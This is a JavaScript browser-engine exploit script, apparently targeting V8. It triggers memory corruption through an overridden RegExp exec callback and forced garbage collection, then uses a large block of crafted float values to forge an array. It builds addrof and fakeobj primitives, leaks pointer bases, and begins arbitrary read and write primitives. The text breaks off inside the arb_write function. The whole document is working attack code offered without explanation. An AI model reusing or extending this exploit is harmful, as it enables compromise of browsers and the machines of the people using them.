class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0];
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1];
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return "0x" + i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

var re = new RegExp('foo', 'g');

var match_object = {};
match_object[0] = {
    toString: function () {
        return "";
    }
};
re.exec = function () {
    helper.mark_sweep_gc();
    delete re.exec;
    re.lastIndex = 1073741823;
    new Array(256);
    RegExp.prototype.exec = function () {
        throw '';
    }
    return match_object;
};
try {
    var newstr = re[Symbol.replace]("fooooo", ".$");
} catch (e) { }
helper.scavenge_gc();
helper.mark_sweep_gc();
fake_object_array = [
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,
    3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270, 3.6943954791292419e-311, 3.7857669981648224e-270,];

fake_array = re.lastIndex;
var convert_array = [{}];
var convert_array2 = [{}];
fake_array[0] = 1.1;

backup_arr_ptr = fake_array[0x404];
obj_map = fake_array[0x403];
fake_array[0x404] = 3.7857669957336934e-270;
fake_array[0x403] = 3.6943954791292419e-311;
compressed_base = helper.f64toi64(convert_array[0]) >> 32n;
compressed_base <<= 32n;
fake_array[0x404] = backup_arr_ptr;

function addrof(obj) {
    convert_array[0] = obj;
    fake_array[0x403] = 3.6943954791292419e-311;
    let r = (helper.f64toi64(convert_array[0]) & 0xffffffffn) | (compressed_base);
    fake_array[0x403] = obj_map;
    return r;
}

function fakeobj(addr) {
    fake_array[0x406] = addr;
    return convert_array2[0];
}

console.log("[*] test addrof primitive");
console.log("[+] leaking addrof(fake_array): " + helper.hex((addrof(fake_array))));
console.log("[+] leaking addrof(convert_array): " + helper.hex((addrof(convert_array))));

console.log("[*] test fakeobj primitive");
var mem_access_array = [3.6943954791292419e-311, 1.6977399608702304e-313];
addrof_a = addrof(mem_access_array);
let fake_array2 = fakeobj(helper.i64tof64(addrof_a - 0x10n));
console.log("[+] fakeobj(addrof(a)): " + helper.hex(addrof(fake_array2)));
console.log("[+] length of fake_array2: " + fake_array2.length);

function arb_read(addr) {
    mem_access_array[1] = helper.i64tof64(((addr & 0xffffffffn) - 8n + 1n) | (0x0000001000000000n));
    return helper.f64toi64(fake_array2[0]);
}

function arb_write(addr, value) {
